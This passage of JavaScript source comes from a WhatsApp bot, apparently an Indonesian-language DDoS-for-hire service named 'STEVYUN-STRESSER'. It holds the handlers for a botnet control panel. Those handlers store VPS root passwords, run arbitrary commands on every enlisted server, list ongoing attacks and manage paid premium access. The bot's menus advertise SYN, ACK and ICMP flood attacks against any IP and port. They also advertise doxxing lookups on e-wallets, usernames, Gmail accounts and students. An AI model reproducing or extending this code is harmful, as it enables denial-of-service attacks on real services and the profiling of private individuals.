    return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Format Salah! ⚠️ Gunakan: /addserver <IP> <Password>" }, { quoted: msg });
  }
  vpsList.push({ host: args[0], username: "root", password: args[1] });
  fs.writeFileSync('vps.json', JSON.stringify(vpsList, null, 2));
  sock.sendMessage(msg.key.remoteJid, { text: `✅ Server ${args[0]} Telah Ditambahkan ✅️.` }, { quoted: msg });

  break;
          case "/exec":
  if (!isOwner(sender)) {
    return sock.sendMessage(msg.key.remoteJid, { text: "❌ Hanya Owner Yang Dapat Mengeksekusi Perintah ❌️." }, { quoted: msg });
  }
  if (!text) {
    return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Masukkan Perintah Untuk Dieksekusi Di Semua VPS ⚠️." }, { quoted: msg });
  }
  let successExec = await executeCommand(text);
  sock.sendMessage(msg.key.remoteJid, { text: `✅ Perintah Dieksekusi Di ${successExec} Server(s) ✅️.` }, { quoted: msg });
  break;
          case "/ongoing":
    if (!ongoingAttacks.length) {
      return sock.sendMessage(msg.key.remoteJid, { text: "❗️ Tidak Ada Serangan Yang Sedang Berjalan ❗️." }, { quoted: msg });
    }
    let ongoingList = `🔥 *Ongoing Attacks* 🔥\n\n`;
    ongoingAttacks.forEach((attack, index) => {
      ongoingList += `🔹 *Attack ${index + 1}*\n👤 User 👤: ${attack.User}\n🎯 Target 🎯: ${attack.Target}\n⚡ Method ⚡️: ${attack.Methods}\n📅 Date 📅: ${attack["Attack Date"]}\n\n`;
    });
    sock.sendMessage(msg.key.remoteJid, { text: ongoingList }, { quoted: msg });
    break;
          case "/addprem":
                    if (!isOwner(sender)) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Hanya Owner Yang Dapat Menambahkan Pengguna Premium STEVYUN-STRESSER ❌️." }, { quoted: msg });
                    }
                    if (!args[0]) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Masukkan UserJid Yang Ingin Ditambahkan ❌️." }, { quoted: msg });
                    }
                    if (isPremium(args[0])) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "✅️ User Sudah Premium Di STEVYUN-STRESSER  ✅️." }, { quoted: msg });
                    }
                    premiumUsers.push(args[0]);
                    savePremiumUsers(premiumUsers);
                    sock.sendMessage(msg.key.remoteJid, { text: `✅ ${args[0]} Telah Ditambahkan Ke Premium STEVYUN-STRESSER ✅️.` }, { quoted: msg });
                    break;
          case "/delprem":
                    if (!isOwner(sender)) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Hanya Owner Yang Dapat Menghapus Pengguna Premium STEVYUN-STRESSER ❌️." }, { quoted: msg });
                    }
                    if (!args[0]) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Masukkan UserJid Yang Ingin Dihapus ❌️." }, { quoted: msg });
                    }
                    if (!isPremium(args[0])) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "🚫 User Tidak Ada Dalam Daftar Premium STEVYUN-STRESSER 🚫." }, { quoted: msg });
                    }
                    premiumUsers = premiumUsers.filter(user => user !== args[0]);
                    savePremiumUsers(premiumUsers);
                    sock.sendMessage(msg.key.remoteJid, { text: `✅ ${args[0]} Telah Dihapus Dari Premium STEVYUN-STRESSER ✅️.` }, { quoted: msg });
                    break;                
          case "/help":
              const menu = `🔰 *Fitur Menu Bot STEVYUN-STRESSER* 🔰
>- /ewallet <nomor>:
> Cek Akun E-wallet
|| ========================================
>- /username <username>:
> Cek Username Di Berbagai Platform
|| ========================================
>- /fakedata <qty> <type>:
> Generate Fake Data
|| ========================================
>- /iplocation <ip>:
> Track IP Address
|| ========================================
>- /google <query>:
> Search Google Bisa Untuk Dorking
|| ========================================
>- /gmail <mail>:
> Get Gmail Information
|| ========================================
>- /mahasiswa <nama>:
> Get Information Data Username
|| ========================================
>- /addprem <nomor>:
> Memberikan Akses Fitur Ke Pengguna Premium
|| ========================================
>- /delprem <nomor>:
> Menghapus Akses Fitur Ke Pengguna Premium
|| ========================================
>- /checkvps
> Melihat Server Vps Yang Masih Hidup
|| ========================================
>- /addserver <ip> <password>:
> Memasukkan Vps Ke Daftar Server
|| ========================================
>- /cnc <start> / <off>:
> Menghidupkan/Mematikan Layanan Server Vps
|| ========================================
>- /exec
> Mengeksekusi Semua Server Di Vps
|| ========================================
>- /ongoing
> Memberikan Informasi Serangan Yang Berjalan
|| ========================================
>- /stresserl4:
> Melihat Fitur DDoS STEVYUN-STRESSER
|| ========================================`;
            sock.sendMessage(msg.key.remoteJid, { text: menu }, { quoted: msg });
                break;
          case "/stresserl4":
                  const stresserMenu = `🚀 *STEVYUN-STRESSER MENU* 🚀\n\n`
                    + `>- /ack-pps <IP> <Port> \n> ACK-PPS Attack\n`
                    + `>- /syn-pps <IP> <Port> \n> SYN-PPS Attack\n`
                    + `>- /icmp-pps <IP> \n> ICMP-PPS Attack\n`
                    + `>- /syn-gbps <IP> <Port> \n> SYN-GBPS Attack\n`
                    + `>- /ack-gbps <IP> <Port> \n> ACK-GBPS Attack\n`
                    + `>- /icmp-gbps <IP> \n> ICMP-GBPS Attack\n`
                    + `>- /stop \n> Stop All Ongoing Attacks\n\n`
                    + `👑 *Powered By STEVEN•STORE🕊🪽* 👑`;
                
                  await sock.sendMessage(msg.key.remoteJid, {
                    contextInfo: {
                      externalAdReply: {
                        showAdAttribution: true,
                        title: `S T E V Y U N - S T R E S S E R  M E N U`,
                        body: `Powered By STEVEN•STORE🕊🪽`,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnailUrl: "https://files.catbox.moe/gcnhf7.jpg",
                        sourceUrl: "https://t.me/stevenstoree"
                      }
                    },
                    text: stresserMenu
                  }, { quoted: msg });
                  break;
          case "/stop":
  if (!isPremium(sender)) {
    return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
  }
  await stopAllScreens();
  sock.sendMessage(msg.key.remoteJid, { text: `✅ All Attacks Stopped And Moved To History ✅️.` }, { quoted: msg });
  break;

                        }
    } catch (err) {
        console.log("❌ Error Di Handler Pesan ❌️:", err.message);
    }
});
// ================================================================== //






}



startPermen();
